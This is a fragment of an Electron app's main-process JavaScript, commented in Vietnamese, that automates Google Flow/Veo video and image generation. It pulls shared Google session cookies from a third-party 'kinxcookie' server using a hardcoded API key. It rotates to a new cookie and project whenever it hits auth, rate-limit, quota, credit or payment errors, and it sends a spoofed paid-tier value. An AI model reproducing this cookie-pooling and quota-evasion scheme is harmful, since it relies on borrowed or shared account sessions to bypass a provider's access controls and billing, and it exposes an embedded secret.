        const idx = global.veoCookieCache.length + 1;
        s(null, `[Init] Đang lấy Cookie từ Server kinxcookie (${attempt}/${maxServerAttempts})...`, "running");
        try {
          const serverCookie = await fetchNewCookieFromServer(attempt > 1 ? "401" : "");
          const projectId = await initProjectForCookie(serverCookie, idx);
          global.veoCookieCache.push({
            cookie: serverCookie,
            projectId,
            timestamp: Date.now(),
            id: `pool-server-${idx}-${Date.now()}`,
          });
          s(null, `[Init] Đã nạp Cookie Server.`, "success");
          return true;
        } catch (err) {
          s(null, `Cookie Server lỗi: ${err.message}`, "error");
          if (attempt < maxServerAttempts) await cancellableSleep(2000);
        }
      }

      // B. Fallback Active Cookie
      if (ac?.value) {
        try {
          const projectId = await initProjectForCookie(ac, "Active");
          global.veoCookieCache.push({
            cookie: ac,
            projectId,
            timestamp: Date.now(),
            id: `pool-active-${Date.now()}`,
          });
          s(null, `[Init] Dùng Active Cookie dự phòng.`, "warning");
          return true;
        } catch (err) {
          console.warn(`Active Cookie lỗi: ${err.message}`);
        }
      }

      // C. Fallback Local Cookie
      if (lc && Array.isArray(lc)) {
        for (let j = 0; j < lc.length; j++) {
          const localCookie = lc[j];
          if (!localCookie?.value) continue;
          try {
            const projectId = await initProjectForCookie(localCookie, `Local-${j}`);
            global.veoCookieCache.push({
              cookie: localCookie,
              projectId,
              timestamp: Date.now(),
              id: `pool-local-${j}-${Date.now()}`,
            });
            localConsumed.add(localCookie.value);
            s(null, `[Init] Dùng Local Cookie dự phòng.`, "warning");
            return true;
          } catch (err) {
            console.warn(`Cookie cá nhân lỗi: ${err.message}`);
          }
        }
      }

      s(null, "ERROR: COOKIE_INIT - Không lấy được Cookie Server/Local.", "failed");
      return false;
    };

    const refreshCookieInPool = async (poolIndex, reason = "") => {
      if ($e || Qe) return false;
      try {
        // 1. Ưu tiên lấy từ Server trước
        try {
          const newCookie = await fetchNewCookieFromServer(reason);
          if ($e || Qe) return false;
          const newProjectId = await initProjectForCookie(newCookie, poolIndex);
          if ($e || Qe) return false;
          const oldItem = global.veoCookieCache[poolIndex];
          if (oldItem) {
            oldItem.isRetired = true;
            if (!oldItem.activeTasks || oldItem.activeTasks <= 0) {
              oldItem.cookie = null;
              oldItem.projectId = null;
            } else {
              console.log(`[Cookie Pool] Cookie cũ còn ${oldItem.activeTasks} luồng đang chạy, khóa lại chờ luồng chạy xong rồi mới xóa.`);
            }
          }
          global.veoCookieCache[poolIndex] = {
            cookie: newCookie,
            projectId: newProjectId,
            timestamp: Date.now(),
            id: `pool-server-${poolIndex}-${Date.now()}`,
            activeTasks: 0,
          };
          s(null, `Đã làm mới Cookie từ Server thành công!`, "success");
          return true;
        } catch (serverErr) {
          console.warn(`[Refresh] Server không trả cookie mới: ${serverErr.message}`);
        }

        // 2. Server không trả cookie -> mới dùng sang localCookies Profile
        if (lc && Array.isArray(lc) && lc.length > 0) {
          let candidates = lc.filter((x) => !localConsumed.has(x.value));
          if (candidates.length === 0) {
            localConsumed = new Set();
            candidates = [...lc];
          }
          const currentValue = global.veoCookieCache[poolIndex]?.cookie?.value;
          const notCurrent = candidates.filter((x) => x.value !== currentValue);
          if (notCurrent.length > 0) candidates = notCurrent;
          for (const localCookie of candidates) {
            if ($e || Qe) return false;
            try {
              const localProjectId = await initProjectForCookie(localCookie, poolIndex);
              if ($e || Qe) return false;
              const oldItem = global.veoCookieCache[poolIndex];
              if (oldItem) {
                oldItem.isRetired = true;
                if (!oldItem.activeTasks || oldItem.activeTasks <= 0) {
                  oldItem.cookie = null;
                  oldItem.projectId = null;
                } else {
                  console.log(`[Cookie Pool] Cookie cũ còn ${oldItem.activeTasks} luồng đang chạy, khóa lại chờ luồng chạy xong rồi mới xóa.`);
                }
              }
              global.veoCookieCache[poolIndex] = {
                cookie: localCookie,
                projectId: localProjectId,
                timestamp: Date.now(),
                id: `pool-local-${poolIndex}-${Date.now()}`,
                activeTasks: 0,
              };
              localConsumed.add(localCookie.value);
              return true;
            } catch (e) { localConsumed.add(localCookie.value); }
          }
        }
        return false;
      } catch (err) {
        return false;
      }
    }
      ;

    const processPrompt = async (item, poolIndex) => {
      if (!item.startImageBase64) {
        s(item.id, "Lỗi: Thiếu ảnh bắt đầu.", "failed");
        return;
      }

      let attempt = 0;
      while (true) {
        if ($e) {
          s(item.id, "Đã dừng.", "idle");
          return;
        }
        attempt++;


        // Load Balancing: Chia tải đều cho các cookie hiện có
        const safeIndex = poolIndex % (global.veoCookieCache.length || 1);
        let poolItem = global.veoCookieCache[safeIndex];

        if (!poolItem || !poolItem.cookie || !poolItem.projectId) {
          s(item.id, `Đang kết nối lại (Luồng ${safeIndex})...`, "processing");
          await refreshCookieInPool(safeIndex);
          poolItem = global.veoCookieCache[safeIndex];
          if (!poolItem) {
            if (attempt >= 3) { s(item.id, "ERROR: COOKIE", "failed"); return; }
            await cancellableSleep(5000);
            continue;
          }
        }

        try {
          if (attempt === 1 || attempt % 5 === 0)
            s(
              item.id,
              `Đang xử lý (Cookie: ${poolItem.cookie.name || "Server"})...`,
              "processing"
            );

          const sessionPrefix = `session-${Date.now()}`;

          // TỐI ƯU HÓA RACE CONDITION: Bắn lệnh Upload cho CẢ 2 ảnh cùng lúc
          let startUploadPromise, endUploadPromise;

          // 1. Khóa Cache cho Ảnh Bắt Đầu
          const startCacheKey = `${poolItem.projectId}_${_r.createHash('md5').update(item.startImageBase64).digest('hex')}`;
          if (global.uploadedImageCache.has(startCacheKey)) {
            const cached = global.uploadedImageCache.get(startCacheKey);
            s(item.id, "Ảnh đầu: Đang dùng Cache", "submitting");
            startUploadPromise = typeof cached === "string" ? Promise.resolve(cached) : cached;
          } else {
            startUploadPromise = bo(l, item.startImageBase64, poolItem.cookie, item.id, poolItem.projectId, "browser:log");
            global.uploadedImageCache.set(startCacheKey, startUploadPromise);
          }

          // 2. Khóa Cache cho Ảnh Kết Thúc
          let endCacheKey = null;
          if (item.endImageBase64) {
            endCacheKey = `${poolItem.projectId}_${_r.createHash('md5').update(item.endImageBase64).digest('hex')}`;
            if (global.uploadedImageCache.has(endCacheKey)) {
              const cached = global.uploadedImageCache.get(endCacheKey);
              s(item.id, "Ảnh cuối: Đang dùng Cache", "submitting");
              endUploadPromise = typeof cached === "string" ? Promise.resolve(cached) : cached;
            } else {
              endUploadPromise = bo(l, item.endImageBase64, poolItem.cookie, item.id, poolItem.projectId, "browser:log");
              global.uploadedImageCache.set(endCacheKey, endUploadPromise);
            }
          }

          // 3. Bây giờ mới chờ (await) cả 2 ảnh hoàn thành
          const startMediaId = await startUploadPromise;
          if (startMediaId) global.uploadedImageCache.set(startCacheKey, startMediaId);
          else { global.uploadedImageCache.delete(startCacheKey); throw new Error("Lỗi tải ảnh bắt đầu"); }

          let endMediaId = null;
          if (item.endImageBase64) {
            endMediaId = await endUploadPromise;
            if (endMediaId) global.uploadedImageCache.set(endCacheKey, endMediaId);
            else { global.uploadedImageCache.delete(endCacheKey); throw new Error("Lỗi tải ảnh kết thúc"); }
          }
          const sceneId = `client-generated-uuid-${Date.now()}-${Math.random()}`;
          const isPortrait = h === "PORTRAIT" || h === "9:16";
          let endpoint;
          if (endMediaId) {
            // endpoint = "https://aisandbox-pa.googleapis.com/v1/video:batchAsyncGenerateVideoStartAndEndImage";
            endpoint = "https://flow.google.com/v1/video:batchAsyncGenerateVideoStartAndEndImage";
          } else {
            // endpoint = "https://aisandbox-pa.googleapis.com/v1/video:batchAsyncGenerateVideoStartImage";
            endpoint = "https://flow.google.com/v1/video:batchAsyncGenerateVideoStartImage";
          }

          const modelKey = flowFormatModelKey("veo_3_1_i2v_lite");

          const requestPayload = {
            startImage: { mediaId: startMediaId },
            aspectRatio: `VIDEO_ASPECT_RATIO_${isPortrait
              ? "PORTRAIT"
              : h === "16:9"
                ? "LANDSCAPE"
                : h.toUpperCase()
              }`,
            seed: Math.floor(Math.random() * 1e5),
            textInput: { structuredPrompt: { parts: [{ text: (item.text || "").trim() }] } },
            metadata: { sceneId: sceneId },
            videoModelKey: modelKey,
          };
          if (endMediaId) {
            requestPayload.endImage = { mediaId: endMediaId };
          }

          // 4. Gửi yêu cầu tạo video
          // 🟢 CODE MỚI (Đã tích hợp Captcha cho Video Đồng Nhất)

          // 1. Lấy Token từ Solver (Đã có cơ chế xếp hàng)
          s(item.id, "Đang xử lý...", "processing");
          const payload = {
            mediaGenerationContext: {
              batchId: `batch-${Date.now()}-${Math.random()}`,
              audioFailurePreference: "BLOCK_SILENCED_VIDEOS"
            },
            clientContext: {
              sessionId: `;${Date.now()}`,
              projectId: poolItem.projectId,
              tool: "IMAGE_FX",
              userPaygateTier: "PAYGATE_TIER_TWO",
            },
            requests: [requestPayload],
          };

          // 4. Gửi yêu cầu tạo video
          const genRes = await We(null, {
            url: endpoint,
            cookie: poolItem.cookie,
            options: {
              method: "POST",
              headers: {},
              body: { ...payload, useV2ModelConfig: true },
            },
          });

          // 5. Kiểm tra phản hồi ban đầu
          // 5. Kiểm tra phản hồi ban đầu (Mapping chuẩn theo schema API Veo mới)
          const workflow = genRes?.workflows?.[0];
          const media = genRes?.media?.[0];
          const opName = media?.name || workflow?.name || genRes?.media?.[0]?.operation?.name;
          const sId = media?.sceneId || genRes?.media?.[0]?.sceneId || genRes?.sceneId || sceneId;

          if (!opName) {
            console.error("[Prompt] Phản hồi không có Workflow Name:", JSON.stringify(genRes));
            throw new Error("Lỗi API: Không nhận được Workflow Name từ Veo.");
          }

          // 6. Polling trạng thái (Chờ video render xong)
          let isComplete = false;
          while (!isComplete && !$e) {
            s(item.id, "Đang xử lý ...", "processing");
            await cancellableSleep(40000);
            if ($e) return;

            const checkRes = await We(null, {
              // url: "https://aisandbox-pa.googleapis.com/v1/video:batchCheckAsyncVideoGenerationStatus",
              url: "https://flow.google.com/v1/video:batchCheckAsyncVideoGenerationStatus",
              cookie: poolItem.cookie,
              options: {
                method: "POST",
                body: { media: [{ name: opName, projectId: poolItem.projectId || poolItem.vidProjectId || poolItem.imgProjectId }] },
              },
            });


            console.log("[Extended Video] checkRes:", JSON.stringify(checkRes).substring(0, 500));
            const opStatus = checkRes?.media?.[0] || checkRes?.media?.[0] || checkRes;

            const statusStr = (opStatus?.status || opStatus?.mediaMetadata?.mediaStatus?.mediaGenerationStatus || opStatus?.mediaStatus?.mediaGenerationStatus || "").toUpperCase();

            if (statusStr === "MEDIA_GENERATION_STATUS_SUCCESSFUL") {
              const vidMeta = opStatus.operation?.metadata?.video || opStatus.video || checkRes.video;
              let finalUrl = vidMeta?.fifeUrl || vidMeta?.servingBaseUri || vidMeta?.generatedVideo?.fifeUrl || vidMeta?.generatedVideo?.servingBaseUri;
              if (!finalUrl) {
                try {
                  // Dynamically get mediaId from available variables (S, m, checkRes, etc)
                  let mId = "";
                  if (typeof opStatus !== 'undefined') mId = opStatus.operation?.name || opStatus.name;
                  if (!mId && typeof checkRes !== 'undefined') mId = checkRes?.media?.[0]?.name;
                  if (!mId && typeof S !== 'undefined') mId = S?.operation?.name || S?.name;
                  if (!mId && typeof m !== 'undefined') mId = m?.operation?.name || m?.name;

                  if (mId) {
                    const fetchFn = global.fetch || require("node-fetch");
                    // Find available cookie variable
                    let cVal = "";
                    if (typeof poolItem !== 'undefined' && poolItem && poolItem.cookie) cVal = poolItem.cookie;
                    else if (typeof cookie !== 'undefined') cVal = cookie;
                    else if (typeof c !== 'undefined') cVal = c;
                    else if (typeof h !== 'undefined') cVal = h;

                    if (typeof cVal === "object") cVal = cVal.value;


                    console.log("[Redirect Debug] Cookie length:", typeof cVal !== "undefined" && cVal ? cVal.length : 0);
                    const redirectRes = await flowMediaRedirectResponse(mId, cVal);
                    if (redirectRes.status === 302 || redirectRes.status === 301 || redirectRes.status === 307) {
                      finalUrl = redirectRes.headers.get("location");
                    } else if (redirectRes.url && redirectRes.url.includes("googleusercontent")) {
                      finalUrl = redirectRes.url;
                    } else {
                      try {
                        const cValStr = (typeof cVal === "object" && cVal) ? (cVal.value || "") : (cVal || "");
                        const signed = await fetchFlowMediaSignedUrl(mId, cValStr);
                        if (signed) { finalUrl = signed; console.log("[Redirect] as29s fallback lay URL:", signed); }
                      } catch (e) { console.error("[Redirect] fallback fail:", e.message); }
                    }
                  }
                } catch (e) {
                  console.error("Lỗi Redirect API:", e);
                }
              }

              if (finalUrl) {
                if (f && f.enabled && f.path)
                  await Ho(
                    l,
                    finalUrl,
                    item.text,
                    f.path,
                    item.originalIndex,
                    f,
                    item.id
                  );
                s(
                  item.id,
                  "Thành công!",
                  "success",
                  finalUrl,
                  opName,
                  sceneId,
                  vidMeta.mediaGenerationId,
                  poolItem.projectId,
                  poolItem.cookie
                );
                return; // Xong
              }
            } else if (statusStr === "MEDIA_GENERATION_STATUS_FAILED") {
              const detail = opStatus.error?.message || opStatus.mediaStatus?.statusDetail || "Không có chi tiết lỗi từ Google";
              console.error(`[Prompt] Chi tiết lỗi FAILED:`, JSON.stringify(opStatus));
              throw new Error(`Lỗi Veo API (FAILED): ${detail}`);
            }
          }
        } catch (err) {
          if ($e || Qe || String(err.message || "").includes("SESSION_STOPPED")) return;
          const em0 = (err.message || "").toLowerCase();
          if (em0.includes("safety") || em0.includes("unsafe") || em0.includes("filtered") || em0.includes("vi phạm") || em0.includes("public_error_audio_filtered")) {
            s(item.id, "Lỗi Vi phạm chính sách", "failed"); return;
          }

          console.error(`[Prompt ${item.id}] Error:`, err.message);
          const errMsg = err.message.toLowerCase();

          let statusMsg = `Lỗi: ${err.message}`;
          let delayTime = 5000;

          if (errMsg.includes("401") || errMsg.includes("unauthenticated")) {
            statusMsg = "401: Lỗi xác thực (Auth)";
            await refreshCookieInPool(safeIndex, "401");
          } else if (errMsg.includes("403") || errMsg.includes("operation name")) {
            statusMsg = "403: Flow web bị chặn, giữ nguyên Cookie/Project";
          } else if (errMsg.includes("429") || errMsg.includes("quota") || errMsg.includes("resource_exhausted") || errMsg.includes("credit") || errMsg.includes("insufficient") || errMsg.includes("payment required") || errMsg.includes("402")) {
            const isRefreshed = await refreshCookieInPool(safeIndex, "429");
            if (isRefreshed) {
              statusMsg = "429: Thao tác quá nhanh (Đã đổi Cookie/Project)";
              delayTime = 3000;
            } else {
              statusMsg = "429: Thao tác quá nhanh (Tạm dừng 60s)";
              delayTime = 60000;
            }
          } else if (errMsg.includes("mediaid") || errMsg.includes("upload")) {
            statusMsg = "Lỗi upload ảnh. Giữ nguyên Cookie/Project, đang thử lại...";
          } else if (errMsg.includes("400") || errMsg.includes("bad request")) {
            statusMsg = "400: Sai định dạng (Bad Request)";
          } else if (errMsg.includes("500") || errMsg.includes("timeout")) {
            statusMsg = "500: Lỗi Server/Timeout";
          }

          s(item.id, statusMsg, "processing");

          // Thời gian chờ linh hoạt (3s nếu có cookie mới, 60s nếu phải chờ)
          if (attempt >= 3) { s(item.id, "ERROR: " + statusMsg.split(":")[0], "failed"); return; }
          await cancellableSleep(delayTime);
        }
      }
    };

    let cookiePoolReady = false;
    try {
      cookiePoolReady = await prepareCookiePool();
    } catch (err) {
      console.warn("Lỗi khởi tạo Pool:", err.message);
    }
    if (!cookiePoolReady || global.veoCookieCache.length === 0) {
      s(null, "ERROR: COOKIE_INIT", "failed");
      return;
    }

    const queue = [...i];
    let activeWorkers = 0;
    let workerIdCounter = 0;

    s(null, `Bắt đầu xử lý ${queue.length} prompt...`, "running");

    const runNext = () => {
      if ($e) { queue.length = 0; return; }

      if (queue.length === 0 && activeWorkers === 0) {
        if (!$e) s(null, "===== Hoàn thành =====", "finished");
        return;
      }

      const maxStreams = r || 1;
      while (queue.length > 0 && activeWorkers < maxStreams) {
        const item = queue.shift();
        activeWorkers++;
        const assignedCookieIndex = workerIdCounter++;
        processPrompt(item, assignedCookieIndex).finally(() => {
          activeWorkers--;
          setTimeout(runNext, 500);
        });
      }
    };

    runNext();
  }
);
// --- KẾT THÚC CODE SỬA ---
he.ipcMain.on(
  "image:start-automation",
  async (
    a,
    {
      prompts: i,
      authToken: c,
      config: cfg,
      currentUser: t,
      concurrentStreams: r,
      activeCookie: ac,
    }
  ) => {
    // [FIX] Giới hạn luồng tối đa là 10. Mặc định là 4.
    if (!r || isNaN(r)) r = 4;
    if (r > 10) r = 10;
    if (r < 1) r = 1;

    const l = he.BrowserWindow.fromWebContents(a.sender);
    if (!l) return;

    // 1. Kiểm tra quyền hạn
    if (
      !t ||
      !t.subscription ||
      new Date(t.subscription.end_date) < new Date()
    ) {
      const msg =
        !t || !t.subscription
          ? "Bạn cần nâng cấp gói."
          : "Gói đăng ký đã hết hạn.";
      he.dialog.showMessageBox(l, {
        type: "warning",
        title: "Yêu Cầu Nâng Cấp",
        message: msg,
      });
      l.webContents.send("navigate-to-view", "packages");
      return;
    }
    // 2. [THÊM MỚI] Chặn gói Cá Nhân
    if (t.subscription.package_name === "Gói Cá Nhân/1 Máy") {
      he.dialog.showMessageBox(l, {
        type: "info",
        title: "Tính Năng Pro",
        message:
          "Chức năng này chỉ dành cho gói Pro trở lên. Vui lòng nâng cấp.",
      });
      l.webContents.send("navigate-to-view", "packages");
      return;
    }
    $e = !1; // Reset cờ dừng
    newSessionAbortController();
    // ===== [BUGFIX-404] Xóa cache session cũ khi bắt đầu chạy =====
    if (global.bananaFrontendUploadCache) global.bananaFrontendUploadCache.clear();
    threadTokenCache.clear();
    console.log("[BUGFIX-404] Đã xóa cache session cũ (uploadedImageCache, bananaFrontendUploadCache, threadTokenCache).");
    // =============================================================
    const MAX_RETRIES = 3;
    const COOKIE_TTL = 60 * 60 * 1000; // 1 Giờ

    // Hàm gửi log
    const s = (id, msg, status, url = null) => {
      if (($e || Qe) && status !== "idle" && status !== "finished") return;
      if (l && !l.isDestroyed()) {
        l.webContents.send("browser:log", {
          promptId: id,
          message: msg,
          status: status,
          videoUrl: url, // UI dùng trường này để hiển thị ảnh
        });
      }
      // console.log(`[ImageGen] [${id || "System"}] ${msg}`);
    };

    // --- QUẢN LÝ COOKIE POOL ---

    const fetchNewCookieFromServer = async (reason = "") => {
      try {
        const res = await (
          await fetch(kinxCookieUrl(reason), {
            headers: { "X-API-Key": "kinx@0$*2048", Authorization: `Bearer ${c}` },
          })
        ).json();
        if (res.success && res.cookie) return res.cookie;
        throw new Error("Server không trả về cookie.");
      } catch (err) {
        throw new Error(`Lỗi lấy cookie: ${err.message}`);
      }
    };

    const initProjectForCookie = async (cookie, index) => {
      // Tạo project qua flow.google.com batchexecute (jHPbke) + lấy UUID (UpteDb),
      // cookie dùng chung từ kinxcookie.php (thay cho labs project.createProject).
      try {
        const projectId = await flowCreateProject(c, flowDefaultProjectTitle(), cookie);
        console.log(`[Init] Tạo project qua Flow RPC thành công: ${projectId}`);
        return projectId;
      } catch (err) {
        throw new Error(`Không tạo được project Flow (Cookie lỗi/401): ${err.message}`);
      }
    };

    // [FIX] Hàm chuẩn bị Pool cho Tạo Ảnh (Whisk)
    const prepareCookiePool = async () => {
      global.veoCookieCache = [];
      const requiredCookies = 1;
      s(
        null,
        `[Init] Sử dụng 1 Cookie cho phiên này...`,
        "running"
      );

      const now = Date.now();

      // Vòng lặp lấy Cookie từ Server cho đến khi đủ
      let initAttempts = 0;
      while (global.veoCookieCache.length < requiredCookies) {
        if ($e) break;
        const idx = global.veoCookieCache.length + 1;

        try {
          let newCookie;
          const hasActiveLocal = ac && (typeof ac === 'string' ? ac.trim().length > 10 : ac.value && ac.value.trim().length > 10);
          try {
            newCookie = await fetchNewCookieFromServer(initAttempts > 0 ? "401" : "");
            s(null, `Cookie #${idx}: Lấy Cookie từ Server thành công (Ưu tiên Server).`, "info");
          } catch (serverErr) {
            if (hasActiveLocal) {
              newCookie = ac;
              s(null, `Cookie #${idx}: Server lỗi, dùng Active Cookie dự phòng.`, "warning");
            } else {
              throw serverErr;
            }
          }

          const projectId = await initProjectForCookie(newCookie, idx);

          global.veoCookieCache.push({
            cookie: newCookie,
            projectId: projectId, // Project này đã kích hoạt CHAMELEON
            timestamp: Date.now(),
            id: `pool-img-${idx}-${Date.now()}`,
          });
          initAttempts = 0;
        } catch (err) {
          initAttempts++;
          s(
            null,
            `Lỗi khởi tạo Cookie #${idx}: ${err.message}. Thử lại (${initAttempts}/3)...`,
            "error"
          );
          if (initAttempts >= 3) {
            s(null, "ERROR: COOKIE_INIT", "failed");
            return false;
          }
          await cancellableSleep(2000);
        }
      }
      return global.veoCookieCache.length >= requiredCookies;
    };
    const refreshCookieInPool = async (poolIndex, reason = "") => {
      if ($e || Qe) return false;
      try {
        const newCookie = await fetchNewCookieFromServer(reason);
        if ($e || Qe) return false;
        const newProjectId = await initProjectForCookie(newCookie, poolIndex);
        if ($e || Qe) return false;
        global.veoCookieCache[poolIndex] = {
          cookie: newCookie,
          projectId: newProjectId,
          timestamp: Date.now(),
          id: `pool-img-${poolIndex}-${Date.now()}`,
        };
        return true;
      } catch (err) {
        return false;
      }
    };

    // --- XỬ LÝ 1 ẢNH (Banana Pro) ---

    const processPrompt = async (item, poolIndex) => {
      if (!item.prompt || !item.prompt.trim()) {
        s(item.id, "Lỗi: Prompt trống.", "error");
        return;
      }

      let attempt = 0;
      while (true) {
        if ($e) return;
        attempt++;


        // Lấy cookie từ pool theo kiểu Round Robin
        const safeIndex = poolIndex % global.veoCookieCache.length;
        let poolItem = global.veoCookieCache[safeIndex];

        // Nếu cookie lỗi/thiếu -> Refresh ngay
        if (!poolItem || !poolItem.cookie || !poolItem.projectId) {
          s(item.id, `Đang thử lại`, "running");
          await refreshCookieInPool(safeIndex);
          poolItem = global.veoCookieCache[safeIndex];
          if (!poolItem) {
            await cancellableSleep(5000);
            continue;
          }
        }

        try {
          // A. Upload Ảnh Input (Nếu có) - Dùng đúng cookie của luồng này
          let imageInputs = [];
          if (item.imageInputBase64) {
            // Thay vì băm MD5 toàn bộ chuỗi base64 (dễ bị khác biệt nếu UI nén canvas sinh ra string khác nhau),
            // ta dùng chung 1 khóa cache cho lô chạy này (vì chỉ có 1 ảnh input cho toàn bộ lô).
            const cacheKey = `${poolItem.projectId}_ref_image`;
            if (global.uploadedImageCache.has(cacheKey)) {
              const cached = global.uploadedImageCache.get(cacheKey);
              if (typeof cached === "string") {
                s(item.id, `Ảnh input: Đã dùng lại (Cache) ⚡`, "submitting");
                imageInputs.push({ name: cached, imageInputType: "IMAGE_INPUT_TYPE_REFERENCE" });
              } else {
                s(item.id, `Ảnh input: Chờ luồng khác tải... ⏳`, "submitting");
                const mId = await cached;
                if (!mId) throw new Error("Lỗi tải ảnh input.");
                imageInputs.push({ name: mId, imageInputType: "IMAGE_INPUT_TYPE_REFERENCE" });
              }
            } else {
              s(item.id, `Upload ảnh input...`, "submitting");
              const uploadPromise = bo(l, item.imageInputBase64, poolItem.cookie, item.id, poolItem.projectId, "browser:log");
              global.uploadedImageCache.set(cacheKey, uploadPromise);
              const mediaId = await uploadPromise;
              if (mediaId) {
                global.uploadedImageCache.set(cacheKey, mediaId);
                imageInputs.push({ name: mediaId, imageInputType: "IMAGE_INPUT_TYPE_REFERENCE" });
              } else {
                global.uploadedImageCache.delete(cacheKey);
                throw new Error("Lỗi tải ảnh input.");
              }
            }
          }

          // B. Gửi lệnh tạo (Banana Pro / GEM_PIX_2)
          s(item.id, "Đang vẽ (Banana Pro)...", "processing");

          const payload = {
            requests: [
              {
                clientContext: { sessionId: `session-${Date.now()}` },
                seed: item.seed || Math.floor(Math.random() * 1e6),
                imageModelName: cfg.model || "GEM_PIX_2", // Hỗ trợ cả 2 model từ UI (Pro và Pro 2)
                imageAspectRatio: `IMAGE_ASPECT_RATIO_${cfg.aspectRatio || "LANDSCAPE"
                  }`,
                // ĐÃ SỬA DÒNG DƯỚI ĐÂY: Tự động đính kèm lệnh cấm vẽ chữ ngầm vào cuối prompt
                prompt: item.prompt + "\n\nCRITICAL RULE: DO NOT render any text, letters, words, signatures, labels, or watermarks in this image. The image must be completely text-free.",
                imageInputs: imageInputs,
              },
            ],
          };

          const res = await We(null, {
            // url: `https://aisandbox-pa.googleapis.com/v1/projects/${poolItem.projectId}/flowMedia:batchGenerateImages`,
            url: `https://flow.google.com/v1/projects/${poolItem.projectId}/flowMedia:batchGenerateImages`,
            cookie: poolItem.cookie,
            options: {
              method: "POST",
              body: payload,
            },
          });

          // C. Xử lý kết quả (Banana Pro trả về ngay)
          const mediaItems = res?.media || [];
          if (
            mediaItems.length > 0 &&
            mediaItems[0].image?.generatedImage?.encodedImage
          ) {
            const base64Img = mediaItems[0].image.generatedImage.encodedImage;
            const dataUrl = `data:image/png;base64,${base64Img}`;

            s(item.id, "Thành công!", "success", dataUrl);

            // Auto Save
            if (cfg.autoSave && cfg.savePath) {
              try {
                // Tạo tên file an toàn
                const safePrompt = item.prompt
                  .substring(0, 30)
                  .replace(/[^a-z0-9]/gi, "_");
                const fileName = `${safePrompt}_${Date.now()}.png`;
                const fullPath = ye.join(cfg.savePath, fileName);

                // Đảm bảo thư mục tồn tại
                if (!be.existsSync(cfg.savePath)) {
                  be.mkdirSync(cfg.savePath, { recursive: true });
                }

                // Lưu file
                await be.promises.writeFile(
                  fullPath,
                  Buffer.from(base64Img, "base64")
                );
                s(item.id, `Đã lưu: ${fileName}`, "success", dataUrl);
              } catch (saveErr) {
                console.error("Lỗi lưu ảnh:", saveErr);
                // Vẫn báo success vì ảnh đã tạo xong, chỉ lỗi lưu
                s(
                  item.id,
                  `Lỗi lưu file: ${saveErr.message}`,
                  "success",
                  dataUrl
                );
              }
            }
            return; // HOÀN THÀNH -> Thoát vòng lặp retry
          } else {
            throw new Error(
              res?.error?.message || "API không trả về dữ liệu ảnh."
            );
          }
        } catch (err) {
          if ($e || Qe || String(err.message || "").includes("SESSION_STOPPED")) return;
          const em0 = (err.message || "").toLowerCase();
          if (em0.includes("safety") || em0.includes("unsafe") || em0.includes("filtered") || em0.includes("vi phạm") || em0.includes("public_error_audio_filtered")) {
            s(item.id, "Lỗi Vi phạm chính sách", "failed"); return;
          }

          let statusMsg = `Lỗi: ${err.message}`;
          const msg = err.message.toLowerCase();
          if (msg.includes("401") || msg.includes("unauthenticated")) {
            statusMsg = "401: Lỗi xác thực (Auth)";
            await refreshCookieInPool(safeIndex, "401");
          } else if (msg.includes("403")) {
            statusMsg = "403: Flow web bị chặn, giữ nguyên Cookie/Project";

          } else if (msg.includes("429") || msg.includes("quota") || msg.includes("resource_exhausted") || msg.includes("rate limit") || msg.includes("throttled")) {
            statusMsg = "429: Thao tác quá nhanh (Limit)";
            await refreshCookieInPool(safeIndex, "429");
          } else if (msg.includes("safety") || msg.includes("unsafe")) {
            statusMsg = "Vi phạm chính sách";
            s(item.id, statusMsg, "failed");
            return;
          } else if (msg.includes("mediaid") || msg.includes("upload")) {
            statusMsg = "Lỗi upload ảnh. Giữ nguyên Cookie/Project, đang thử lại...";

          } else if (msg.includes("400") || msg.includes("bad request")) {
            statusMsg = "400: Sai định dạng (Bad Request)";
          } else if (msg.includes("500") || msg.includes("timeout")) {
            statusMsg = "500: Lỗi Server/Timeout";
          }

          s(item.id, statusMsg, "error");

          if (attempt >= 3) { s(item.id, "ERROR: " + statusMsg.split(":")[0], "failed"); return; }
          await cancellableSleep(2000);
        }
      }
    };

    // --- MAIN FLOW: SLIDING WINDOW (WORKER POOL) ---

    let cookiePoolReady = false;
    try {
      cookiePoolReady = await prepareCookiePool();
    } catch (err) {
      s(null, "Lỗi khởi tạo Pool Cookie.", "error");
    }
    if (!cookiePoolReady || global.veoCookieCache.length === 0) {
      s(null, "ERROR: COOKIE_INIT", "failed");
      return;
    }

    const queue = [...i];
    const totalItems = queue.length;
    let activeWorkers = 0;
    let completedCount = 0;
    let workerIdCounter = 0;

    s(null, `Bắt đầu tạo ${totalItems} ảnh. Luồng: ${r}`, "running");

    // Hàm điều phối luồng liên tục
    const runNext = () => {
      if ($e) { queue.length = 0; return; }

      // Kiểm tra điều kiện dừng
      if (queue.length === 0 && activeWorkers === 0) {
        if (!$e) s(null, "===== Hoàn thành tất cả! =====", "finished");
        return;
      }

      // Lấp đầy các luồng đang trống
      while (queue.length > 0 && activeWorkers < r) {
        const item = queue.shift();
        activeWorkers++;

        // Phân phối cookie xoay vòng
        const cookieIdx = workerIdCounter % global.veoCookieCache.length;
        workerIdCounter++;

        // Chạy và tự động gọi lại runNext khi xong (bất kể thành công/thất bại)
        processPrompt(item, cookieIdx).finally(() => {
          activeWorkers--;
          completedCount++;

          // Delay nhỏ 300ms để tránh spam CPU cục bộ
          setTimeout(runNext, 300);
        });
      }
    };

    // Kích hoạt
    runNext();
  }
);
// ==============================================================================
// ==============================================================================
// --- BẮT ĐẦU: THÊM TÍNH NĂNG "STUDIO TẠO VIDEO" (TỪ ẢNH THAM CHIẾU - R2V) ---
// ==============================================================================
he.ipcMain.on("video:create-from-references", async (event, args) => {
  const {
    prompts,
    authToken,
    aspectRatio,
    autoSaveConfig,
    currentUser,
    concurrentStreams,
    upscaleMode,
    activeCookie,
    localCookies,
  } = args;

  const win = he.BrowserWindow.fromWebContents(event.sender);
  if (!win) return;

  if (!currentUser || !currentUser.subscription || new Date(currentUser.subscription.end_date) < new Date()) {
    he.dialog.showMessageBox(win, {
      type: "warning",
      title: "Yêu Cầu Nâng Cấp",
      message: "Bạn cần nâng cấp gói để sử dụng tính năng này."
    });
    return;
  }

  $e = false;
  Qe = false;
  newSessionAbortController();
  // ===== [BUGFIX-404] Xóa cache session cũ khi bắt đầu chạy =====
  if (global.bananaFrontendUploadCache) global.bananaFrontendUploadCache.clear();
  threadTokenCache.clear();
  console.log("[BUGFIX-404] Đã xóa cache session cũ (uploadedImageCache, bananaFrontendUploadCache, threadTokenCache).");
  // =============================================================
  let localConsumed = new Set();
  if (activeCookie && (activeCookie.value || activeCookie.cookie)) localConsumed.add(activeCookie.value || activeCookie.cookie);

